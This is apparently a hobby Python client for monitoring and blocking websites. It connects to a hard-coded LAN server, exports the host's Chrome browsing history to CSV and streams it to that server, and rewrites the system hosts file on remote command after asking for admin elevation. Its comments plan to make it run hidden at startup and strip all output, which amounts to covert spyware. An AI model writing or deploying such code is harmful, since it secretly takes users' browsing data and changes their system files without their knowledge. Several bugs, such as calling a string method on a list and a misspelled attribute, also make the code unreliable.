import socket,os,time,platform,ctypes,sys
import browserhistory as bh
from datetime import datetime as dt



linux_host = '/etc/hosts'
window_host = r"C:\Windows\System32\drivers\etc\hosts"
default_folder = ""
redirect = "127.0.0.1"
computer_name=socket.gethostname()

oran = "192.168.1.28"
amal_b = "10.30.57.83"

def operating_system():#TODO add startup capability
    global default_folder
    os_name = platform.system()
    if os_name == "Linux":
        default_folder = linux_host
    elif os_name == "Windows":
        default_folder = window_host

class Client():#TODO: ip working,make it exe,always on - turns on restart, all print() wiil be deleted
    def __init__(self, port=8810, ip="192.168.1.28"):# ip wiil change
        self.s = socket.socket()
        while True:
            try:
                self.s.connect((ip,port))
            except Exception as e:
                print("waiting to server to come up")
            else:
                break  
        print("connected")
        self.sites_to_block=[]    #[[url1,start,end],[url2.start,end]]
                 

    def run(self):
        self.first_message()
        while True:
            self.block_websites() 
            self.limitation()
            time.sleep(0.5)
            self.history()
                     
    def first_message(self):
        self.s.send(f"name%{computer_name}".encode())
        
    def history(self):
        #if self.connection_available():
            self.s.send(f"history%{computer_name}".encode())
            bh.get_browserhistory()   
            bh.write_browserhistory_csv()
            f = open("chrome_history.csv", "rb")
            print ("Sending Data ....")
            l = f.read(1024)
            while (l):
                    self.s.send(l)
                    l = f.read(1024)
            f.close()
            print("Sending Complete")
    
    def limitation(self):
        self.s.settimeout(0.1)
        message=""
        try:
            message=self.s.recv(1024).decode()
        except Exception:
            pass
        else:
            request = message.split("^^^")
            if request[0]== "add url":
                if request.startswith("www.",6,10):
                    self.sites_to_block.append([request[1],request[2],request[3]])           
                else:
                    request[1]=request[1].split("//")[-1]# to add 
                    self.sites_to_block.append([request[1],request[2],request[3]])           
            elif request[0]== "remove url":
                self.site_to_block[[request[1],request[2],request[3]]]=[request[1],0,0]#remove url from host file
            
        
    def block_websites(self):
        for websites in self.sites_to_block:
            if dt(dt.now().year, dt.now().month, dt.now().day, websites[1]) < dt.now() < dt(dt.now().year, dt.now().month, dt.now().day, websites[2]): # fuck off go to work
                     
                with open(default_folder, 'r+') as hostfile:
                    hosts = hostfile.read()
                    if websites[0] not in hosts:
                        hostfile.write(redirect+' '+websites[0]+"\n")
            else:
                with open(default_folder, 'r+') as hostfile:
                    hosts = hostfile.readlines()
                    hostfile.seek(0)
                    for host in hosts:
                        if not any(site in host for site in websites[0]):
                            hostfile.write(host)
                    hostfile.truncate()
                print("Good Time...")
        print("Manipulation succeeded") 
    
    def connection_available(self):
        try:
           self.s.send("connection_available?".encode())
        except Exception as e:
            return False
        else:
            return True

def main():
    operating_system()
    client = Client()
    client.run()

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if __name__ == '__main__':
    if is_admin():
        pass
        #main()
    else:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)#sys.argv[1:] if exe
        main()
